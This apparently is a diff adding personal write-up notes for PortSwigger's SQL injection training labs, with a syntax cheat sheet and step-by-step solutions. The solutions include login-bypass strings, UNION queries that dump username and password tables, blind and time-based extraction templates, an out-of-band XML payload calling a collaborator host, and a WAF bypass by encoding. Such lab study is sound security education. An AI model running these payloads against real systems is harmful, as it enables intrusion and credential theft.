@@ -1,0 +1,222 @@
+- Retrieving hidden data
+- Subverting application logic
+- Blind SQL injection vulnerabilities
+- Second-order SQL injection (Useful when register not filter special char)
+- Examining the database:
++ Some database have different: Syntax for string concatenation, Comments, Batched (or stacked) queries, Platform-specific APIs, Error messages.
++ First step: query version of database, database tables exist, and the columns they contain
+    SELECT * FROM v$version (Oracle)
+    SELECT * FROM information_schema.tables
++ https://portswigger.net/web-security/sql-injection/cheat-sheet
+- UNION attack:
++ Determining the number of columns required
++ Finding columns with a useful data type
++ Retrieving multiple values within a single column
+- Blind SQL injection:
++ Triggering conditional responses
+    + triggering conditional errors
++ Extracting sensitive data via verbose SQL error messages
++ Triggering time delays
++ Out-of-band (OAST) techniques
+
+Oracle db:
+- Every 'SELECT' query must use the 'FROM' keyword and specify a valid table
+- Has built-in table on Oracle called 'dual' (' UNION SELECT NULL FROM DUAL--)
+- SELECT BANNER, NULL FROM v$version
+- Has 'all_tables' return 'TABLE_CATALOG', 'TABLE_SCHEMA', 'TABLE_NAME', 'DATA_TYPE'
+      'all_tab_columns' return like above plus 'COLUMN_NAME'
+
+MySQL db:
+- Comment by '--' must have at least 1 space after it '-- ', other db don't need
+
+Other except Oracle:
+- 'information_schema.tables' return 'TABLE_CATALOG', 'TABLE_SCHEMA', 'TABLE_NAME', 'TABLE_TYPE'
+- 'information_schema.columns' return like above plus 'COLUMN_NAME'
+
+Oracle --> v$version
+PostgreSQL --> version()
+Microsoft SQL Server --> @@version
+MySQL --> version() and @@version
+
+
+01_SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data
+- Find user input -> Try SQL injection
+- Description:
++ It's just a simple sql injection, just go to this path "/filter?category=Gifts'+OR+1=1--"
++ Original query: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
++ Modified query: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+02_SQL_injection_vulnerability_allowing_login_bypass
+- Find user input -> Try SQL injection
+- Description:
++ username: administrator'--
++ password: abc
++ Original query: SELECT * FROM users WHERE username = 'administrator' AND password = 'abc'
++ Modified query: SELECT * FROM users WHERE username = 'administrator'--' AND password = 'abc'
+
+03_SQL_injection_attack_querying_the_database_type_and_version_on_Oracle
+- Find user input -> Try SQL injection
+- Description:
++ Here we can injection by using UNION query (Note: Must have same number of column, just try and test 1,2,3,... col)
++ In this lab, we tested and know 2 columns are enough to injection
++ Just go to /filter?category=Pets'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
++ Original query: SELECT col1, col2 FROM categories WHERE category = 'Pets' ......
++ Modified query: SELECT col1, col2 FROM categories WHERE category = 'Pets' UNION SELECT BANNER, NULL FROM v$version--'.....
+
+04_SQL_injection_attack_querying_the_database_type_and_version_on_MySQL_and_Microsoft
+- Find user input -> Try SQL injection
+- Description:
++ Same as lab 03 but using MySQL and Microsoft instead of Oracle
++ Check cheatsheet above for syntax and do the same as Oracle
++ Just go to /filter?category=Pets'+UNION+SELECT+@@version,+NULL--%20
++ Original query: SELECT col1, col2 FROM categories WHERE category = 'Pets' ......
++ Modified query: SELECT col1, col2 FROM categories WHERE category = 'Pets' UNION SELECT @@version, NULL--%20 (must have space in this case)
+
+05_SQL_injection_attack_listing_the_database_contents_on_non_Oracle_databases
+- Find user input -> Try SQL injection
+- Description:
++ First check the list table name:
+    /filter?category=Pets'+UNION+SELECT+TABLE_NAME,+NULL+FROM+information_schema.tables--%20
++ We can search for user table, and see the one name users_myazjf (if u don't know which table, just check each), go and check:
+    /filter?category=Pets'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+information_schema.columns+WHERE+table_name+=+'users_myazjf'--%20
++ And finally, we found it:
+    /filter?category=Pets%27+UNION+SELECT+username_pjgaer,+password_eambel+FROM+users_myazjf--%20
++ Just login by what you found
++ Note:
+    + Format of table you need is user_{abcdef}, column is username_{abcdef}, password_{abcdef}
+    + Should add %20(space) in the end of query in case DB is MySQL
+
+06_SQL_injection_attack_listing_the_database_contents_on_Oracle
+- Find user input -> Try SQL injection
+- Description:
++ First check list table name:
+    /filter?category=Pets'+UNION+SELECT+TABLE_NAME,+NULL+FROM+ALL_TABLES--
++ We can search for user table, and see the one name users_myazjf (if u don't know which table, just check each), go and check:
+    /filter?category=Pets'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+ALL_TAB_COLUMNS+WHERE+table_name+=+'USERS_XHOMAF'--
++ And finally, we found it:
+    /filter?category=Pets'+UNION+SELECT+USERNAME_VSEOCC,+PASSWORD_BGVINN+FROM+USERS_XHOMAF--
++ Just login by what you found
++ Note:
+    + Format of table you need is user_{abcdef}, column is username_{abcdef}, password_{abcdef}
+    + Should add %20(space) in the end of query in case DB is MySQL
+
+07_SQL_injection_UNION_attack_determining_the_number_of_columns_returned_by_the_query
+- Find user input -> Try SQL injection
+- Description:
++ Just add 1 more row NULL by UNION query, try to find number of columns and then do this
+    /filter?category=Pets'+UNION+SELECT+NULL,+NULL,+NULL--%20
++ You can count number of columns by this query
+    ' ORDER BY [number of col]--
+
+08_SQL_injection_UNION_attack_finding_a_column_containing_text
+- Find user input -> Try SQL injection
+- Description:
++ Just go to this path, modify the string follow lab description
++ Just try to put the string in any column to know it is string
+    /filter?category=Pets'+UNION+SELECT+NULL,+'Feqjgg',+NULL+FROM+information_schema.tables--%20
+
+09_SQL_injection_UNION_attack_retrieving_data_from_other_tables
+- Find user input -> Try SQL injection
+- Description:
++ It's not Oracle db
++ We can do the same as lab 6, but replace syntax when check table
++ Step:
+    Check number of col: /filter?category=Pets'+ORDER+BY+{num}--%20
+    Check list tables: /filter?category=Pets'+UNION+SELECT+{",+".join(columns)}+FROM+information_schema.tables--%20
+    Check columns of table: /filter?category=Pets'+UNION+SELECT+{",+".join(columns)}+FROM+information_schema.columns+WHERE+TABLE_NAME+=+'{table_name}'--%20
+    List column content: /filter?category=Pets'+UNION+SELECT+{",+".join(columns)}+FROM+{table_name}--%20
+    Login by credential found
+
+10_SQL_injection_UNION_attack_retrieving_multiple_values_in_a_single_column
+- Find user input -> Try SQL injection
+- Description:
++ The special thing about this lab is 2 col, but only 1 is string
++ So we need to concat username and password into 1 column
+    username||'-'||password     (concat depend on db type)
+
+11_Blind_SQL_injection_with_conditional_responses
+- Find cookies that using sql query -> Try SQL injection
+- Description:
++ First find len of password
++ Then try to bruteforce password using binary search
++ Final login by credencial found
++ Note:
+    + Becareful when try to binary search, sql query do not case sensitive, so we need ASCII() function
+        ASCII(SUBSTRING(password, idx, 1))
+
+12_Blind_SQL_injection_with_conditional_errors
+- Find cookies that using sql query -> Try SQL injection
+- Description:
++ Like previous lab, but not different in response, so we trigger error to check, by this template query
+    full_sql = f"' AND (SELECT CASE WHEN {sql_injection} THEN 1/0 ELSE 1 END FROM users WHERE username = '{username}') = 1--"
++ First find len of password
++ Then try to bruteforce password using binary search
++ Final login by credencial found
++ Note:
+    + This is Oracle database, so need correct syntax for it
+    + Different syntax compare previous lab
+
+13_Visible_error_based_SQL_injection
+- Find cookies that using sql query -> Try SQL injection
+- Description:
++ Follow solution of lab:
++ This lab using CAST to make error, so error will display in response
++ Add ' after TrackingId, cause error and error messages appear -> So we know full sql query of it
++ When try "TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--"
+    + Got error messages "Unterminated string literal started at position 95 in SQL"
+    + It mean query is limit character, so can't do like previous lab
+    + So we delete TrackingId to free up
++ TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+    + ERROR: invalid input syntax for type integer: "administrator"
++ TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+    + ERROR: invalid input syntax for type integer: "jyu7iex1n469cr6238gs"
++ Note: Some syntax syntax
+    +' AND 1=(SELECT username FROM users LIMIT 1 OFFSET 1)::int--
+    +' AND 1=(SELECT password FROM users WHERE username LIKE'a%')::int--
+
+14_Blind_SQL_injection_with_time_delays
+- Find cookies that using sql query -> Try SQL injection
+- Description:
++ This lab not display error message like previous
++ So we need to trigger by time delay
+    '||pg_sleep({delay})--
++ Idk why but delay=1 is enough to make request delay over 10s
+
+15_Blind_SQL_injection_with_time_delays_and_information_retrieval
+- Find cookies that using sql query -> Try SQL injection
+- Description:
++ Like previous lab, it vuln in sql time delay
++ Check db type and it is PostgreSQL
++ Then we use PostgreSQL syntax:
+    + Check password length
+    + Bruteforce password by binary search
+    + Login by credential we got
+
+16_Blind_SQL_injection_with_out_of_band_interaction
+- Find cookies that using sql query -> Try SQL injection
+- Description:
++ This lab using Oracle db
++ Like description, we need to trigger interaction with burp collaborator Server
++ Just send command
+    + TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"{collaborator_url}">+%25remote%3b]>'),'/l')+FROM+dual--
++ It will send information to collaborator server
+
+17_Blind_SQL_injection_with_out_of_band_data_exfiltration
+- Find cookies that using sql query -> Try SQL injection
+- Description:
++ Same as previous lab but we need to check administrator credential
++ The strategy is same as some previous lab, nothing different
++ But i don't have burp proffessional now, so i can't solve it (must use Burp Collaborator's default public server)
++ If other enviroment not block, you can use https://webhook.site as a replace tool
+
+18_SQL_injection_with_filter_bypass_via_XML_encoding
+- Find user input -> Try SQL injection
+- Description:
++ Just like lab description, it has vuln in stock check feature
++ Try to catch a request, we can see that it's using XML payload
++ Try to injection by simple request
+    + 1 UNION SELECT username || '~' || password FROM users
+    + I choose this because it only return 1 columns
++ But after that, we will be blocked by WAF, need other way to bypass this
+    + It return something like "Attack detected"
++ So we choose dec_entities to encode it, then it return all credential back
